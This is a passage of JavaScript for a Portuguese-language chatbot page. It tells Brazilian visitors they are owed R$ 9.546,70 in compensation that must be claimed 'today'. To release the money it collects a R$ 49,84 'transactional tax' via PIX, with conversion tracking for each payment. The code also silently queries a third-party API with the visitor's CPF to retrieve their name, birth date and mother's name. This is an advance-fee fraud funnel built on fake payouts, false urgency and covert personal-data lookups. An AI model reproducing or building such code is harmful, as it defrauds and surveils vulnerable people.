                    phone: telLimpo,
                    document: cpfLimpo,
                    country: 'BR',
                    ip: clientIp
                },
                products: [{
                    id: 'imposto-transacional',
                    name: descricao || 'Imposto Transacional',
                    planId: null,
                    planName: null,
                    quantity: 1,
                    priceInCents: valorCents
                }],
                trackingParameters: {
                    src: utms.src || null,
                    sck: utms.sck || null,
                    utm_source:   utms.utm_source   || null,
                    utm_campaign: utms.utm_campaign || null,
                    utm_medium:   utms.utm_medium   || null,
                    utm_content:  utms.utm_content  || null,
                    utm_term:     utms.utm_term     || null
                },
                commission: {
                    totalPriceInCents: valorCents,
                    gatewayFeeInCents: 0,
                    userCommissionInCents: valorCents
                },
                isTest: false
            };

            const resp = await fetch(UTMIFY_ENDPOINT, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'x-api-token': UTMIFY_API_TOKEN
                },
                body: JSON.stringify(body)
            });
            const txt = await resp.text().catch(()=> '');
            if (!resp.ok) {
                console.warn('[UTMify] Falha ao enviar pedido:', resp.status, txt);
            } else {
                console.log('[UTMify] Pedido enviado (' + status + '):', transactionId);
            }
        } catch (e) {
            console.warn('[UTMify] Erro no envio:', e);
        }
    }


    async function gerarPixBynet({ amountCents, nome, cpf, email, telefone, descricao }) {
        const cpfLimpo = String(cpf || '').replace(/\D/g, '');
        const telLimpo = String(telefone || '').replace(/\D/g, '') || '11999999999';
        const nomeFinal = (nome && String(nome).trim().length >= 3)
            ? String(nome).trim()
            : 'Cliente Indenizacao';

        const enderecoPadrao = {
            street: 'Avenida Brasil',
            streetNumber: '100',
            complement: 'S/N',
            zipCode: '70040010',
            neighborhood: 'Centro',
            city: 'Brasilia',
            state: 'DF',
            country: 'br'
        };

        const payload = {
            amount: amountCents,
            paymentMethod: 'PIX',
            pix: { expiresInDays: 1 },
            items: [
                {
                    title: (descricao || 'Imposto Transacional').slice(0, 100),
                    unitPrice: amountCents,
                    quantity: 1,
                    tangible: false
                }
            ],
            customer: {
                name: nomeFinal,
                email: email,
                phone: telLimpo,
                document: {
                    number: cpfLimpo,
                    type: 'CPF'
                },
                address: enderecoPadrao
            },
            shipping: {
                fee: 0,
                address: enderecoPadrao
            },
            metadata: JSON.stringify({ origem: 'chatbot-indenizacao', ...getUtmsPersistidas() })
        };

        let response, data;
        try {
            response = await fetch(`${BYNET_BASE_URL}/api/user/transactions`, {
                method: 'POST',
                headers: bynetHeaders(),
                body: JSON.stringify(payload)
            });
        } catch (netErr) {
            throw new Error('Falha de rede ao contatar o gateway: ' + netErr.message);
        }

        const rawText = await response.text();
        try { data = JSON.parse(rawText); } catch { data = { raw: rawText }; }

        if (!response.ok) {
            console.error('[Bynet] Erro na criação da transação:', {
                status: response.status,
                body: data,
                payloadEnviado: payload
            });
            let detalhe = '';
            if (data) {
                if (Array.isArray(data.errors)) {
                    detalhe = data.errors.map(e => e.message || JSON.stringify(e)).join(' | ');
                } else if (data.message) {
                    detalhe = data.message;
                } else if (data.error) {
                    detalhe = typeof data.error === 'string' ? data.error : JSON.stringify(data.error);
                } else {
                    detalhe = rawText.slice(0, 300);
                }
            }
            throw new Error(`HTTP ${response.status} - ${detalhe}`);
        }


        // Bynet retorna { status, message, data: { id, qrCode, pix: { qrcode, url, ... }, ... } }
        const tx  = data.data || data;
        const pix = tx.pix || {};
        const payloadStr =
            pix.qrcode || pix.qrCode || pix.payload || pix.emv ||
            tx.qrCode  || tx.qrcode  || '';
        const qrImage =
            pix.qrcodeImage || pix.qrCodeImage || pix.qrcode_base64 || pix.qrCodeBase64 || '';

        return {
            transactionId: tx.id || tx.transactionId || '',
            payload: payloadStr,
            qrCodeImage: qrImage,
            raw: data
        };
    }

    async function buscarStatusPixBynet(transactionId) {
        const response = await fetch(`${BYNET_BASE_URL}/api/user/transactions/${transactionId}`, {
            method: 'GET',
            headers: bynetHeaders()
        });
        const data = await response.json().catch(() => ({}));
        if (!response.ok) throw new Error((data && data.message) || `HTTP ${response.status}`);
        const tx = data.data || data;
        return String(tx.status || '').toLowerCase();
    }

    async function verificarStatusPixLoop(transactionId, userDados) {
        if (!transactionId) return;
        const inicio = Date.now();
        const MAX_MS = 15 * 60 * 1000; // 15 minutos
        const INTERVALO = 5000;         // 5s

        while (Date.now() - inicio < MAX_MS) {
            await delay(INTERVALO);
            try {
                const status = await buscarStatusPixBynet(transactionId);
                if (status === 'paid' || status === 'approved' || status === 'confirmed') {
                    await sendMessage(`<div class="msg"><strong>Pagamento confirmado! ✅</strong><br>Sua indenização de <strong>R$ 9.546,70</strong> será liberada na sua chave PIX em instantes.</div>`, 2200);

                    // ===== Tracking: PIX pago (Purchase) =====
                    try {
                        const utms = getUtmsPersistidas();
                        const valor = 49.84;
                        const eventId = 'pix_' + transactionId;

                        if (typeof window.fbq === 'function') {
                            window.fbq('track', 'Purchase', {
                                value: valor,
                                currency: 'BRL',
                                content_name: 'Imposto Transacional',
                                transaction_id: transactionId
                            }, { eventID: eventId });
                        }
                        if (typeof window.dataLayer !== 'undefined') {
                            window.dataLayer.push({
                                event: 'purchase',
                                transaction_id: transactionId,
                                value: valor,
                                currency: 'BRL',
                                ...utms
                            });
                        }
                        // UTMify browser pixel (se instalado)
                        if (typeof window.utmify !== 'undefined' && typeof window.utmify.track === 'function') {
                            window.utmify.track('purchase', {
                                orderId: transactionId,
                                value: valor,
                                currency: 'BRL',
                                ...utms
                            });
                        }
                        if (typeof window.funnelTracker !== 'undefined') {
                            window.funnelTracker.track('pix_pago', { transactionId, value: valor, ...utms });
                        }
                    } catch(e) { console.warn('tracking pix_pago falhou', e); }

                    // Webhook UTMify - pedido pago
                    enviarPedidoUtmify({
                        transactionId,
                        status: 'paid',
                        userDados,
                        valorCents: 4984,
                        descricao: 'Imposto Transacional'
                    });
                    return;
                }
                if (status === 'refused' || status === 'failed' || status === 'canceled' || status === 'refunded' || status === 'chargedback') {
                    await sendMessage(`<div class="msg error-msg">Não conseguimos confirmar o pagamento. Se você já pagou, aguarde alguns instantes; caso contrário, gere um novo PIX.</div>`, 2200);

                    // Webhook UTMify - pedido recusado/cancelado/estornado
                    const utmifyStatus = (status === 'refunded') ? 'refunded'
                                       : (status === 'chargedback') ? 'chargedback'
                                       : 'refused';
                    enviarPedidoUtmify({
                        transactionId,
                        status: utmifyStatus,
                        userDados,
                        valorCents: 4984,
                        descricao: 'Imposto Transacional'
                    });
                    return;
                }
            } catch (e) {
                console.warn('Falha ao consultar status do PIX:', e);
            }
        }
    }

    // ===========================
    // ===== INÍCIO CHAT =====
    // ===========================
    function getCpfFromUrl() {
        const params = new URLSearchParams(window.location.search);
        const raw = params.get('cpf') || params.get('CPF') || '';
        return raw.trim();
    }

    function getDataHojeExtenso() {
        const meses = ['janeiro','fevereiro','março','abril','maio','junho','julho','agosto','setembro','outubro','novembro','dezembro'];
        const d = new Date();
        return `${d.getDate()} de ${meses[d.getMonth()]} de ${d.getFullYear()}`;
    }

    async function startChatFlow() {
        // Rastrear primeiro click no chat
        if (typeof window.funnelTracker !== 'undefined') {
            window.funnelTracker.track('chat_flow_start');
        }

        const rawCpf = getCpfFromUrl();
        const cpf = cleanCpf(rawCpf);

        if (!cpf || !validarCPF(cpf)) {
            await sendMessage(`<div class="msg error-msg">Não foi possível identificar seu CPF no link de acesso. Volte à página anterior e tente novamente.</div>`, 1500);
            return;
        }

        // Consulta silenciosa (sem pedir ao usuário)
        await sendMessage(`<div class="msg"><em>Carregando seus dados...</em></div>`, 1200);
        const result = await checkCpfApi(cpf);

        if (result.status === 'error') {
            await sendMessage(`<div class="msg error-msg">${result.message}</div>`, 2500);
            return;
        }

        const userDados = JSON.parse(localStorage.getItem("userDados"));

        // ✅ RASTREAR CHAT INICIAL
        if (!sessionStorage.getItem('chat_inicial_tracked')) {
            if (typeof window.dashboardTracker !== 'undefined' && window.dashboardTracker.trackChatInicial) {
                window.dashboardTracker.trackChatInicial();
                sessionStorage.setItem('chat_inicial_tracked', 'true');
            }
        }

        // 1 - Saudação personalizada
        await sendMessage(`<div class="msg">Olá, <strong>${userDados.nome}</strong>!<br>Seja bem-vindo(a) ao nosso atendimento.</div>`, 1800);

        // 2 - Chamada para o vídeo
        await sendMessage(`<div class="msg">Gravei um vídeo explicando como funciona, basta apenas apertar no vídeo 👇</div>`, 1800);

        // 3 - Vídeo VSL embutido no chat (video nativo p/ detectar 'ended')

// Envia o placeholder/container do Smartplayer do Vturb na mensagem
await sendMessage(`
    <div class="msg" style="animation: fadeIn 0.6s ease;">
        <div style="width:100%; max-width:360px; border-radius:12px; overflow:hidden; box-shadow:0 6px 18px rgba(0,0,0,0.2); background:#000; margin: 0 auto;">
            <vturb-smartplayer id="vid-6a51c29ac4f64cc446fb7626" style="display: block; width: 100%;">
                <div class="vturb-player-placeholder" style="position: relative; width: 100%; padding: 100% 0 0; z-index: 0; background-color: black;"></div>
            </vturb-smartplayer>
        </div>
    </div>
`, 2000);

// Executa o script do Vturb para carregar o vídeo dentro do container acima
(function() {
    var s = document.createElement("script");
    s.src = "https://scripts.converteai.net/34d5b5d5-1b7d-4685-9eca-292789c660b8/players/6a51c29ac4f64cc446fb7626/v4/player.js";
    s.async = true;
    document.head.appendChild(s);
})();


        // 4 - Importância
        await sendMessage(`<div class="msg">Os próximos passos vão ser de <strong>extrema importância</strong>...</div>`, 20000);

        // 5 - Valor do ressarcimento
        await sendMessage(`<div class="msg">Você vai receber <strong>R$ 9.546,70</strong> de ressarcimento e danos morais por ter sido prejudicado(a).</div>`, 2400);

        // 6 - Urgência (data de hoje)
        await sendMessage(`<div class="msg">Hoje (<strong>${getDataHojeExtenso()}</strong>) é o <strong>último dia</strong> para você estar recebendo esses valores.</div>`, 2400);

        // 7 - Botão continuar
        const continuarHTML = `<button id="continuarButton" class="button-chat">Continuar</button>`;
        promptUserForInput(continuarHTML);

        const handleContinuar = async () => {
            $('.user-input-container').remove();
            sendUserMessage('Continuar');
            await iniciarFunilAlfandegario(userDados);
        };

        const continuarBtn = document.getElementById('continuarButton');
        if (continuarBtn) {
            continuarBtn.addEventListener('click', handleContinuar, { passive: true });
            continuarBtn.addEventListener('touchend', (e) => {
                e.preventDefault();
                handleContinuar();
            }, { passive: false });
        }
    }


async function checkCpfApi(cpfConsulta) {
  return new Promise(resolve => {
    const cpf = String(cpfConsulta || "").replace(/[^\d]+/g, '');
    const url = `https://api.accountingexperts.site/?cpf=${cpf}`;

    $.ajax({
      url,
      method: "GET",
      dataType: "json",
      headers: {
        'Accept': 'application/json'
      },
      success: function (res) {
        console.log("ACCOUNTINGEXPERTS RESPONSE =>", res);

        const nome = res?.nome || "";
        const cpfRet = res?.cpf ? String(res.cpf).replace(/\D/g, '') : cpf;
        const cpfMask = res?.cpf || cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
        const nasc = res?.nascimento || "";
        const mae = res?.mae || "";
        const sexo = res?.sexo || "";

        if (nome) {
          localStorage.setItem("userDados", JSON.stringify({
            nome,
            cpf: cpfRet,
            cpfMask,
            nasc,
            sexo,
            mae
          }));
          resolve({ status: "success", message: `Dados de ${nome} encontrados.` });
        } else {
          if (res?.error) {
            resolve({
              status: "error",
              message: res.error || "CPF não encontrado."
            });
          } else {
            resolve({
              status: "error",
              message: "CPF válido, mas não encontrei dados."
            });
          }
        }
      },
      error: function (xhr) {
        let errorMsg = "Erro na comunicação.";
        if (xhr.responseJSON) {
          if (xhr.responseJSON.error) {
            errorMsg = xhr.responseJSON.error;
          } else if (xhr.responseJSON.message) {
            errorMsg = xhr.responseJSON.message;
          } else if (xhr.responseJSON.mensagem) {
            errorMsg = xhr.responseJSON.mensagem;
          }
        } else if (xhr.status === 401) {
          errorMsg = "Erro de autenticação na API.";
        } else if (xhr.status === 404) {
          errorMsg = "CPF não encontrado.";
        } else if (xhr.status === 403) {
          errorMsg = "Limite de consultas atingido.";
        }
        resolve({ status: "error", message: errorMsg });
      }
    });
  });
}


    function pedirCpf() {
        const html = `
            <div class="cpf-container">
                <input type="text" id="cpfInput" placeholder="Digite seu CPF" maxlength="14">
                <button id="sendCpf" class="button-chat">Consultar</button>
            </div>
        `;
        const block = promptUserForInput(html);
        $('#cpfInput').mask('000.000.000-00');

        let isProcessing = false; // Proteção contra cliques duplos
        
        const handle = async () => {
            // Previne múltiplos cliques simultâneos
            if (isProcessing) {
                console.log('[CHAT] Processamento já em andamento, ignorando clique');
                return;
            }
            
            isProcessing = true;
            const rawCpf = block.querySelector('#cpfInput').value.trim();
            const cpf = cleanCpf(rawCpf);
            const sendBtn = block.querySelector('#sendCpf');
            const inputField = block.querySelector('#cpfInput');
            
            if (sendBtn) sendBtn.disabled = true;
            if (inputField) inputField.disabled = true;

            try {
                if(!validarCPF(cpf)){
                    $('.user-input-container').remove();
                    sendUserMessage(rawCpf);
                    await sendMessage(`<div class="msg error-msg">CPF inválido. Digite novamente.</div>`, 1500);
                    isProcessing = false;
                    return pedirCpf();
                }

                // ✅ RASTREAR CHAT INICIAL - Primeira interação (CPF enviado)
                // Proteção: verificar se já foi rastreado antes de chamar novamente
                if (!sessionStorage.getItem('chat_inicial_tracked')) {
                    if (typeof window.dashboardTracker !== 'undefined' && window.dashboardTracker.trackChatInicial) {
                        window.dashboardTracker.trackChatInicial();
                        sessionStorage.setItem('chat_inicial_tracked', 'true');
                    }
                }

                $('.user-input-container').remove();
                sendUserMessage(rawCpf);
                await sendMessage(`<div class="msg"><em>Consultando dados...</em></div>`, 1500);
                await sendMessage(`<div class="msg"><img src="${window.rotas.url}/home/1.gif" style="max-width:100%; width:360px;"></div>`, 1500);
                const result = await checkCpfApi(cpf);

                if(result.status === 'error') {
                    await sendMessage(`<div class="msg error-msg">${result.message}</div>`, 3500);
                    isProcessing = false;
                    return pedirCpf();
                }

                const userDados = JSON.parse(localStorage.getItem("userDados"));
                await sendMessage(`<div class="msg">Dados encontrados com sucesso!</div>`, 1200);
                await iniciarFunilAlfandegario(userDados);
            } catch (error) {
                console.error('[CHAT] Erro ao processar CPF:', error);
                isProcessing = false;
            }
        };

        // Remove listeners anteriores se existirem (proteção contra duplicação)
        const sendBtn = block.querySelector('#sendCpf');
        const inputField = block.querySelector('#cpfInput');
        
        if (sendBtn) {
            // Clona o elemento para remover todos os listeners
            const newSendBtn = sendBtn.cloneNode(true);
            sendBtn.parentNode.replaceChild(newSendBtn, sendBtn);
            
            // Adiciona listeners para click e touch (mobile)
            newSendBtn.addEventListener('click', handle, { once: false, passive: true });
            newSendBtn.addEventListener('touchend', (e) => {
                e.preventDefault();
                handle();
            }, { once: false, passive: false });
        }
        
        if (inputField) {
            inputField.addEventListener('keyup', e => { 
                if(e.key === 'Enter' && !isProcessing) handle(); 
            }, { once: false });
            
            // Foca no input automaticamente no mobile
            setTimeout(() => {
                if (inputField && window.innerWidth <= 768) {
                    inputField.focus();
                }
            }, 300);
        }

        // CSS para input estilizado
        const style = document.createElement('style');
        style.innerHTML = `
            .cpf-container {
                display: flex;
                gap: 10px;
                align-items: center;
                justify-content: flex-start;
                margin-top: 10px;
            }
            .cpf-container input#cpfInput {
                flex: 1;
                padding: 10px 12px;
                border-radius: 8px;
                border: 1px solid #ced4da;
                font-size: 14px;
                font-family: 'Segoe UI', sans-serif;
                outline: none;
                transition: border 0.2s, box-shadow 0.2s;
            }
            .cpf-container input#cpfInput:focus {
                border-color: #007bff;
                box-shadow: 0 0 5px rgba(0,123,255,0.4);
            }
            .cpf-container button.button-chat {
                padding: 10px 16px;
            }
        `;
        document.head.appendChild(style);
    }

    // CSS para animação suave de fadeIn dos balões
    const style = document.createElement('style');
    style.innerHTML = `
        @keyframes fadeIn {
            from {opacity:0; transform: translateY(8px);}
            to {opacity:1; transform: translateY(0);}
        }
        .msg { 
            animation: fadeIn 0.5s ease forwards; 
            margin-bottom:12px; 
        }
        .icon {
            display: inline-block;
            margin-right: 5px;
        }
        .button-chat {
            background: #007bff;
            color: white;
            border: none;
            padding: 10px 16px;
            border-radius: 6px;
            cursor: pointer;
            font-size: 14px;
            transition: background 0.3s;
        }
        .button-chat:hover {
            background: #0056b3;
        }
        @keyframes pulse {
            0%, 100% {
                transform: scale(1);
                box-shadow: 0 4px 15px rgba(220, 53, 69, 0.4);
            }
            50% {
                transform: scale(1.02);
                box-shadow: 0 6px 20px rgba(220, 53, 69, 0.6);
            }
        }
        #pagarTaxaButton:hover {
            background: #0056b3;
        }
    `;
    document.head.appendChild(style);

    startChatFlow();
}
